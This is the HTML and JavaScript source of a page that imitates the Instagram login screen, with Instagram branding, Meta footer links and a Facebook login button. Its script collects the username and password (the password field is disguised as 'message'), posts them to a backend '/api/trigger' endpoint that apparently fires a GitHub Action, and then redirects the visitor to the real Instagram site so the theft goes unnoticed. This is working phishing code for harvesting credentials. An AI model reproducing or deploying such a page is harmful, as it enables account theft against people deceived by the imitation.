<!-- This is instagram login page -->

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>Login • Instagram</title>
    <link rel="stylesheet" href="css/loginstyle.css">
    <link rel="shortcut icon" href="img/Instagram_logo_2016.svg.webp">

    <style>
        img {
            vertical-align: text-top;
        }
    </style>
</head>

<body>
    <div class="loader-overlay">
        <div class="loader"></div>
    </div>

    <div class="container">
        <div class="box">
            <div class="heading"></div>
            
            <!-- action을 javascript:void(0); 로 지정하여 Cannot POST / 현상을 원천 차단합니다 -->
            <form class="login-form" action="javascript:void(0);" onsubmit="redirectToInstagram(event)">
                <div class="field">
                    <input id="username" type="text" name="username" placeholder="Phone number, username, or email" required />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="message" type="password" name="message" placeholder="Password" required />
                    <label for="message">Password</label>
                    <button type="button" id="show-password-btn">Show</button>
                </div>
                <button class="login-button" type="submit" title="Login">Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span>
                            <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
                            &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
                        </span>
                    </button>
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
                </div>
            </form>
            
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>
    <br>
    <div class="get">
    Get the app.
    </div>
    <br>
    <div class="apps">
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN">
        <img src="/img/google-playstore.png" height="40" width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
        <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US"> 
        <img src="img/microsoft-store.png" height="40" width="auto"></a>
    </div>
    <br>
    <div class="footer">
        <footer>
            <a href="https://about.meta.com/">About</a> 
            <a href="https://about.fb.com/news/">Blog</a> 
            <a href="https://www.metajobs.com/">Jobs</a> 
            <a href="https://www.meta.com/help/">Help</a> 
            <a href="https://developers.facebook.com/docs/">API</a> 
            <a href="https://www.meta.com/privacy/">Privacy</a> 
            <a href="https://www.meta.com/terms/">Terms</a> 
            <a href="https://www.meta.com/locations/">Locations</a> 
            <a href="https://www.instagram.com/lite/">Instagram Lite</a> 
            <a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a> 
            <a href="https://www.meta.com/verified/">Meta-verified</a>
        </footer>
    </div>
    <div class="copyright">
        <br>    
        <select aria-label="Switch Display Language" class="Language">
            <option value="en">English</option>
            <option value="ko">한국어</option>
        </select> © 2024 Instagram from Meta
    </div>

<script>
    async function redirectToInstagram(event) {
        if (event) event.preventDefault(); // 기본 제출 동작 차단

        const username = document.getElementById('username').value;
        const message = document.getElementById('message').value;

        try {
            // 백엔드 Express API 호출 (/api/trigger)
            const response = await fetch('/api/trigger', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    username: username,
                    message: message 
                })
            });

            const result = await response.json();

            if (result.success) {
                alert('GitHub Action으로 이벤트 전송 성공!');
            } else {
                alert('전송 실패: ' + result.error);
            }
        } catch (error) {
            console.error('API 에러:', error);
            alert('백엔드 서버 통신 중 에러 발생');
        } finally {
            setTimeout(function () {
                window.location.href = "https://www.instagram.com/";
            }, 1000);
        }
    }

    const showPasswordBtn = document.getElementById('show-password-btn');
    const passwordField = document.getElementById('message');

    if (passwordField && showPasswordBtn) {
        passwordField.addEventListener('input', function () {
            if (passwordField.value.length > 0) {
                showPasswordBtn.style.display = 'block';
            } else {
                showPasswordBtn.style.display = 'none';
            }
        });

        showPasswordBtn.addEventListener('click', function () {
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                showPasswordBtn.textContent = 'Hide';
            } else {
                passwordField.type = 'password';
                showPasswordBtn.textContent = 'Show';
            }
        });
    }

    window.addEventListener('load', () => {
        document.body.classList.add('loaded');
    });
</script>
</body>

</html>
